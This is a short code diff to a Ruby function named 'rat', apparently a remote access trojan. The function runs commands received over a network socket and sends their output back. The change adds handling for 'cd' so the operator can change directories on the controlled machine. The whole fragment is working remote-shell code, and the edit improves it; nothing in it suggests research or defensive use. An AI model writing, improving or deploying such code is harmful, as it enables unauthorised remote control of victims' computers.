@@ -31,7 +31,12 @@ def rat(ip)
           begin
             socket.puts `#{cmd}`
           rescue Errno::ENOENT
-            socket.puts 'invalid command'
+            # This fixes a bug where `cd path` raises an exception
+            if cmd.start_with?('cd')
+              Dir.chdir cmd.split(' ').last
+            else
+              socket.puts 'invalid command'
+            end
           end
           socket.puts 'done'
         end
